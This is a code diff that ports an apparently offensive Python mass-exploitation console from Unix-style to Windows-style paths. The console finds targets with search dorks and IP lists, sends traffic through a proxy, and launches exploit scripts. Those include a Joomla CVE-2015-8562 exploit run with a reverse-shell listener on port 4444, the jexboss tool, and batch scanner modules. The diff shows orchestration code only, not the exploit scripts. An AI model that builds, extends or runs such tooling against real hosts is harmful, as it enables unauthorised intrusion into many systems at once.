@@ -27,9 +27,9 @@ class SessionParameters:
 
     INIT_DIR = os.getcwd()
     PROXY_CONF = INIT_DIR + \
-        '/data/proxy.conf'
+        '\\data\\proxy.conf'
     USE_PROXY = True
-    IP_LIST = 'data/ip_list.txt'
+    IP_LIST = INIT_DIR + '\\data\\ip_list.txt'
 
 
 def debug_except():
@@ -105,11 +105,10 @@ def execute(cmd):
     elif cmd == 'info':
         print(
             colors.CYAN +
-            '''[*] Current directory: {}\n
-            [*] Init directory: {}\n
-            [*] Target: {}\n
-            [*] Proxy config: {}
-            '''.format(
+            '[*] Current directory: {}\
+            \n[*] Init directory: {}\
+            \n[*] Target: {}\
+            \n[*] Proxy config: {}'.format(
                 os.getcwd(),
                 SessionParameters.INIT_DIR,
                 SessionParameters.IP_LIST,
@@ -117,7 +116,9 @@ def execute(cmd):
     elif cmd.startswith('target'):
         target = ''.join(cmd.split()[1:])
         print(colors.BLUE + '[i] Target changed to {}'.format(target))
-        SessionParameters.IP_LIST = 'data/' + target
+        SessionParameters.IP_LIST = SessionParameters.INIT_DIR +\
+            '\\data\\' +\
+            target
     elif cmd == 'init' or cmd == 'i':
         print(colors.CYAN +
               '[*] Going back to init_dir...' + colors.END)
@@ -136,10 +137,11 @@ def execute(cmd):
             console.print_error('[-] Error with baidu: ')
             debug_except()
     elif cmd == 'proxy':
-        if not os.path.exists('data/ss.json'):
-            console.print_error('[-] Please make sure \"data/ss.json\" exists')
+        if not os.path.exists('data\\ss.json'):
+            console.print_error(
+                '[-] Please make sure \"data\\ss.json\" exists')
         try:
-            subprocess.Popen(['./tools/ss-proxy', '-c', './data/ss.json'],
+            subprocess.Popen(['.\\tools\\ss-proxy', '-c', '.\\data\\ss.json'],
                              stderr=subprocess.PIPE,
                              stdout=subprocess.PIPE,
                              shell=False)
@@ -177,13 +179,13 @@ def execute(cmd):
             cmd = cmd.strip().split()
             dork = cmd[1]
             # well yes im a lazy guy
-            subprocess.call(['./exploits/joomla/joomlaCVE-2015-8562.py',
+            subprocess.call(['.\\exploits\\joomla\\joomlaCVE-2015-8562.py',
                              '--dork', dork, '--revshell=\'127.0.0.1\'', '--port=4444'])
         except BaseException as err:
             console.print_error(str(err))
             debug_except()
     elif cmd.startswith('jexboss'):
-        jexboss(cmd, './exploits/jexboss/jexboss.py')
+        jexboss(cmd, '.\\exploits\\jexboss\\jexboss.py')
     elif cmd == 'q' or cmd == 'quit':
         check_kill_process('ss-proxy')
         sys.exit(0)
@@ -194,7 +196,7 @@ def execute(cmd):
         list_exp()
     elif cmd == 'z' or cmd == "zoomeye":
         try:
-            os.chdir('./zoomeye')
+            os.chdir('.\\zoomeye')
             subprocess.call(['python3', 'zoomeye.py'])
         except (EOFError, KeyboardInterrupt, SystemExit):
             pass
@@ -358,8 +360,8 @@ def scanner(scanner_args):
     e_args += custom_args
     e_args += ['-t']
     target_list = open(
-        SessionParameters.INIT_DIR + '/' + SessionParameters.IP_LIST, encoding='utf-8')
-    os.chdir('./exploits/' + work_path)
+        SessionParameters.IP_LIST, encoding='utf-8')
+    os.chdir('.\\exploits\\' + work_path)
     console.print_warning(
         '\n[!] DEBUG: ' + str(e_args) + '\nWorking in ' + os.getcwd())
     console.print_warning('\n[!] It might be messy, get ready!' + '\n')
@@ -419,15 +421,10 @@ def main():
             '[?] Use ip_list.txt as target list? [y/n] ' +
             colors.END)).strip()
     if answ.lower() == 'n':
-        os.system("ls data")
-        SessionParameters.IP_LIST = 'data/' + str(
-            input(
-                colors.CYAN +
-                '[=] Choose your target IP list (must be in ./data) ')).strip()
-        if SessionParameters.IP_LIST == 'data/':
-            SessionParameters.IP_LIST = 'data/ip_list.txt'
-    else:
-        pass
+        os.system("dir data")
+        SessionParameters.IP_LIST = SessionParameters.INIT_DIR + '\\data\\' +\
+            console.input_check(
+                '[=] Choose your target IP list (must be in ./data) ', allow_blank=False)
     while True:
         try:
             cmd = input(
